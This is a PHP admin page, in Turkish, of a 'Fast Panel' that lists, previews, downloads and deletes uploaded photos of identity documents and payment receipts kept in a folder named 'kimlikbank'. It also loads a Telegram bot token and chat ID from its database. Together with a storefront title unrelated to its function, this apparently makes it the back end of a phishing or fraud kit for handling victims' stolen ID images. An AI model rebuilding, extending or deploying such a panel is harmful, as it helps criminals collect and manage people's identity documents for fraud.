<?php
session_start();

require_once '../inc/brain.php';
date_default_timezone_set('Europe/Istanbul');

if (!isset($_SESSION['fast-admin']) || $_SESSION['fast-admin'] !== true) {
    header("Location: fast-login.php");
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['action'])) {
    header('Content-Type: application/json');
    $response = ['success' => false, 'message' => 'Gecersiz islem.'];

    try {
        if ($_POST['action'] === 'delete_receipt') {
            $filename = basename($_POST['filename']);
            $filePath = '../kimlikbank/' . $filename;
            if (file_exists($filePath)) {
                unlink($filePath);
                $response = ['success' => true, 'message' => 'Kimlik basariyla silindi.'];
            } else {
                $response['message'] = 'Dosya bulunamadi.';
            }
        }
    } catch (Exception $e) {
        $response['message'] = 'Sunucu hatasi: ' . $e->getMessage();
    }
    
    echo json_encode($response);
    exit;
}

$receipts = glob('../kimlikbank/*.{jpg,jpeg,png,gif}', GLOB_BRACE);
$total_results = count($receipts);
$limit = 10;
$page = isset($_GET['page']) && is_numeric($_GET['page']) ? (int)$_GET['page'] : 1;
$total_pages = ceil($total_results / $limit);
$offset = ($page - 1) * $limit;
$paginated_receipts = array_slice($receipts, $offset, $limit);

try {
    $stmt = $pdo->query("SELECT * FROM yetkili LIMIT 1");
    $yetkili = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($yetkili) {
        $_SESSION['yetkili_id'] = $yetkili['id'];
        $kullanici_adi = $yetkili['yetkiliadi'];
        $parola_hash = $yetkili['parola_hash'];
        $kisa_hash = substr($parola_hash, 0, 4) . str_repeat('*', strlen($parola_hash) - 7) . substr($parola_hash, -3);
        $ip_adresi = $yetkili['ip_adresi'];
        $son_giris_tarihi = $yetkili['son_giris_tarihi'];
        $son_giris_ip = $yetkili['son_giris_ip'];
        $son_giris_cihaz = $yetkili['son_giris_cihaz'];
        $son_giris_tarayici = $yetkili['son_giris_tarayici'];
    } else {
        die("Yetkili kaydı bulunamadı.");
    }

    $stmtPanel = $pdo->query("SELECT t_token, chat_id FROM panel LIMIT 1");
    $panel = $stmtPanel->fetch(PDO::FETCH_ASSOC);
    $t_token = $panel['t_token'] ?? 'Token bulunamadi.';
    $chat_id = $panel['chat_id'] ?? null;

} catch (PDOException $e) {
    die("Veritabani hatasi: " . $e->getMessage());
}
?>
<!DOCTYPE html>
<html lang="tr" data-bs-theme="dark">
<head>
    <meta charset="utf-8" />
    <title>Marco | Ürün Yönetimi</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/vendor.min.css" rel="stylesheet">
    <link href="css/app.min.css" rel="stylesheet">
    <link href="css/jquery-jvectormap.css" rel="stylesheet">
    <link href="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/locale/bootstrap-table-tr-TR.min.js"></script>
    <script src="https://unpkg.com/tableexport.jquery.plugin/tableExport.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/extensions/export/bootstrap-table-export.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
    <script src="https://unpkg.com/xlsx/dist/xlsx.full.min.js"></script>
</head>
<body>
    <div id="app" class="app">
        <?php include('../inc/fast-header.php'); include('../inc/fast-sidebar.php'); ?>
         <div class="app-content">
    <ul class="breadcrumb">
        <li class="breadcrumb-item"><a href="#">Fast Panel</a></li>
        <li class="breadcrumb-item active">Kimlikler</li>
    </ul>

    <h1 class="page-header">Kimlikler <small>[Detaylı Yönetim]</small></h1>
            
            <div class="position-fixed top-0 end-0 p-3" style="z-index: 1100;">
                <div id="notificationToast" class="toast align-items-center text-white border-0" role="alert" aria-live="assertive" aria-atomic="true">
                    <div class="d-flex"><div class="toast-body" id="notificationToastBody"></div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div>
                </div>
            </div>

            <div class="row justify-content-center">
                <div class="col-xl-10">
                    <div class="card">
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-hover align-middle">
                                    <thead class="table-dark">
                                        <tr>
                                            <th style="width: 100px;">Kimlik</th>
                                            <th>Dosya Adi</th>
                                            <th class="text-end" style="width: 150px;">İşlemler</th>
                                        </tr>
                                    </thead>
                                    <tbody id="receiptsTableBody">
                                        <?php if (empty($paginated_receipts)): ?>
                                            <tr id="no-receipts-row"><td colspan="3" class="text-center py-4">Henuz dekont eklenmemis.</td></tr>
                                        <?php else: 
                                            foreach ($paginated_receipts as $receipt):
                                                $filename = basename($receipt);
                                        ?>
                                            <tr id="receipt-row-<?php echo str_replace('.', '-', $filename); ?>">
                                                <td><img src="<?php echo htmlspecialchars($receipt); ?>" alt="Kimlik" class="img-fluid rounded" style="width: 80px; height: 80px; object-fit: cover;"></td>
                                                <td><?php echo htmlspecialchars($filename); ?></td>
                                                <td class="text-end">
                                                    <button class="btn btn-sm btn-info view-btn" data-src="<?php echo htmlspecialchars($receipt); ?>"><i class="bi bi-eye"></i></button>
                                                    <a href="<?php echo htmlspecialchars($receipt); ?>" download class="btn btn-sm btn-success"><i class="bi bi-download"></i></a>
                                                    <button class="btn btn-sm btn-danger delete-btn" data-filename="<?php echo htmlspecialchars($filename); ?>"><i class="bi bi-trash3-fill"></i></button>
                                                </td>
                                            </tr>
                                        <?php endforeach; endif; ?>
                                    </tbody>
                                </table>
                            </div>
                            <?php if ($total_pages > 1): ?>
                            <nav class="d-flex justify-content-center mt-3"><ul class="pagination">
                                <?php for ($i = 1; $i <= $total_pages; $i++): ?>
                                    <li class="page-item <?php echo ($i == $page) ? 'active' : ''; ?>"><a class="page-link" href="?page=<?php echo $i; ?>"><?php echo $i; ?></a></li>
                                <?php endfor; ?>
                            </ul></nav>
                            <?php endif; ?>
                        </div>
                        <div class="card-arrow"><div class="card-arrow-top-left"></div><div class="card-arrow-top-right"></div><div class="card-arrow-bottom-left"></div><div class="card-arrow-bottom-right"></div></div>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="imageModal" tabindex="-1">
        <div class="modal-dialog modal-xl modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="imageModalTitle">Kimlik Görüntüsü</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body text-center">
                    <img id="modalImage" src="" class="img-fluid" alt="Kimlik Goruntusu">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                </div>
            </div>
        </div>
    </div>
    
   

   <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="js/app.min.js"></script>
    <script src="js/dashboard.demo.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const imageModal = new bootstrap.Modal(document.getElementById('imageModal'));
            const modalImage = document.getElementById('modalImage');
            const toastEl = new bootstrap.Toast(document.getElementById('notificationToast'));

            function showToast(message, isSuccess = true) {
                const toastBody = $('#notificationToastBody');
                $('#notificationToast').removeClass('bg-danger bg-primary').addClass(isSuccess ? 'bg-primary' : 'bg-danger');
                toastBody.html(`<i class="bi ${isSuccess ? 'bi-check-circle-fill' : 'bi-exclamation-triangle-fill'} me-2"></i> ${message}`);
                toastEl.show();
            }

            $('#receiptsTableBody').on('click', '.view-btn', function() {
                const imgSrc = $(this).data('src');
                modalImage.src = imgSrc;
                imageModal.show();
            });

            $('#receiptsTableBody').on('click', '.delete-btn', function() {
                const filename = $(this).data('filename');
                Swal.fire({
                    title: filename,
                    text: "Bu dekontu silmek istediginizden emin misiniz? Bu islem geri alinamaz.",
                    icon: 'warning', showCancelButton: true, confirmButtonColor: '#d33',
                    cancelButtonColor: '#3085d6', confirmButtonText: 'Evet, Sil!',
                    cancelButtonText: 'Vazgec', background: '#282a36', color: '#fff'
                }).then((result) => {
                    if (result.isConfirmed) {
                        $.post('', { action: 'delete_receipt', filename: filename }, function(res) {
                            if(res.success) {
                                showToast(res.message, true);
                                $('#receipt-row-' + filename.replace('.', '-')).fadeOut(500, function() { 
                                    $(this).remove(); 
                                    if ($('#receiptsTableBody tr').length === 0) {
                                        location.reload();
                                    }
                                });
                            } else {
                                showToast(res.message, false);
                            }
                        }, 'json').fail(() => showToast('Bir sunucu hatasi olustu.', false));
                    }
                });
            });
        });
    </script>
    <script src="js/vendor.min.js"></script>
    <script src="js/app.min.js"></script>
    <script src="js/dashboard.demo.js"></script>
</body>
</html>